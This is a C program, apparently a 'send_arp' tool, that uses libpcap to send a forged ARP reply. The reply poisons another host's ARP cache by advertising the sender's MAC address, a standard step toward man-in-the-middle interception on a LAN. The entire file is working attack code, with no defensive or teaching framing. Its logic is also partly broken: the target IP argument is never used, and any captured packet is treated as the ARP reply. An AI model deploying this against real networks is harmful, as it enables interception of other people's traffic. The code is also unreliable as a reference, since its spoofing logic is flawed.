#include <stdio.h>
#include <unistd.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <net/ethernet.h>
#include <netinet/in.h>


unsigned char* makePacket(char* interface, char* gateway_ip);
void inputMacAddr(unsigned char* packet, char* addr);
void mac_eth0(unsigned char MAC_str[13], char* interface);

int main(int argc, char *argv[])
{
    pcap_t *handle;			/* Session handle */
    char *dev;			/* The device to sniff on */
    char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
    char s_ip[16],t_ip[16];

    if (argc !=4){
        puts("usage : send_arp wlan0 [sender ip] [targetip]");
        return 0;
    }
    dev=argv[1];
    strcpy(s_ip,argv[2]);
    strcpy(t_ip,argv[3]);
    /* Open the session in promiscuous mode */
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return 0;
    }

    //  Making packet  //
    unsigned char* packet = (unsigned char *)malloc(42*sizeof(unsigned char));
    packet = makePacket(dev,s_ip);

    //  Sending packet  //
    if (pcap_sendpacket(handle, packet, 42 ) != 0)
    {
        fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
        return -1;
    }

    // Recieving packet  //
    struct pcap_pkthdr *header;	/* The header that pcap gives us */
    const unsigned char *rpacket;		/* The actual packet */

    int retValue;
    /* Grab a packet */
    retValue = pcap_next_ex(handle, &header, &rpacket);
    if( retValue <= 0 ){
        printf("Error grabbing packet");
        return -1;
    }

    unsigned char* arpspacket = (unsigned char *)malloc(42*sizeof(unsigned char));
    struct ether_header* arpsether;
    arpsether = (struct ether_header*) arpspacket;

    //Input mymac address
    char mymac[20];
    mac_eth0((unsigned char*)mymac,dev);
    for (int i=13;i>6;i--)
        mymac[i]=mymac[i-1];
    mymac[6]='-';

    memcpy(arpspacket,rpacket+ETH_ALEN,ETH_ALEN);
    inputMacAddr(arpspacket+ETH_ALEN,mymac);
    arpsether->ether_type=htons(ETH_P_ARP);

    //ETHERNET End  //ARP Start
    struct arphdr* arpHead;
    arpHead= (struct arphdr*)(arpspacket+ETH_HLEN);
    arpHead->ar_hrd = htons(ARPHRD_ETHER);
    arpHead->ar_pro = htons(ETHERTYPE_IP);
    arpHead->ar_hln = 0x06;
    arpHead->ar_pln = 0x04;
    arpHead->ar_op = htons(ARPOP_REPLY);

    inputMacAddr(arpspacket+ETH_HLEN+8,mymac);

    struct ifreq ifr;
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
    ioctl(s, SIOCGIFADDR, &ifr);
    close(s);

    long ipaddr = inet_addr(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
    memcpy(arpspacket+ETH_HLEN+14,&ipaddr,4);

    // input destination part
    memcpy(arpspacket+ETH_HLEN+18,rpacket+ETH_ALEN,6);

    ipaddr=inet_addr(s_ip);
    memcpy(arpspacket+ETH_HLEN+14,&ipaddr,4);

    if (pcap_sendpacket(handle, arpspacket, 42 ) != 0)
    {
        fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
        return -1;
    }
    pcap_close(handle);
    return 0;
}

void mac_eth0(unsigned char MAC_str[13], char* interface)
{
    int s,i;
    struct ifreq ifr;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifr.ifr_name, interface);
    ioctl(s, SIOCGIFHWADDR, &ifr);
    for (i=0; i<ETH_ALEN; i++)
        sprintf((char *)&MAC_str[i*2],"%02X",((unsigned char*)ifr.ifr_hwaddr.sa_data)[i]);
    MAC_str[12]='\0';
}

unsigned char* makePacket(char* interface, char* s_ip)
{
    int i,s;
    unsigned char* packet = (unsigned char *)malloc(42*sizeof(unsigned char));
    struct ifreq ifr;
    char mymac[20];
    struct ether_header *etherHead;
    struct arphdr *arpHead;

    etherHead = (struct ether_header*) packet;
    inputMacAddr(packet,"FFFFFF-FFFFFF");

    mac_eth0((unsigned char*)mymac,interface);
    for (i=13;i>6;i--)
        mymac[i]=mymac[i-1];
    mymac[6]='-';
    inputMacAddr(packet+6,mymac);
    etherHead->ether_type=htons(ETH_P_ARP);

    //ETHERNET End  //ARP Start
    arpHead= (struct arphdr*)(packet+ETH_HLEN);
    arpHead->ar_hrd = htons(ARPHRD_ETHER);
    arpHead->ar_pro = htons(ETHERTYPE_IP);
    arpHead->ar_hln = 0x06;
    arpHead->ar_pln = 0x04;
    arpHead->ar_op = htons(ARPOP_REQUEST);

    //Input mymac address

    inputMacAddr(packet+ETH_HLEN+8,mymac);

    s = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
    ioctl(s, SIOCGIFADDR, &ifr);
    close(s);

    long ipaddr = inet_addr(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
    memcpy(packet+ETH_HLEN+14,&ipaddr,4);

    //Destination part
    inputMacAddr(packet+ETH_HLEN+18,"000000-000000");
    ipaddr=inet_addr(s_ip);
    memcpy(packet+ETH_HLEN+24,&ipaddr,4);

    return packet;
}

void inputMacAddr(unsigned char* packet, char* addr)
{
    char *endptr;
    char temp[10]={0,};
    for (int j=0; j<3; j++){
        memcpy(temp,addr+j*2,2);
        temp[2]=0;
        packet[j] = (unsigned char)strtol(temp, &endptr, 16);
    }
    for (int j=0; j<3; j++){
        memcpy(temp,addr+7+j*2,2);
        temp[2]=0;
        packet[3+j] = (unsigned char)strtol(temp, &endptr, 16);
    }
}
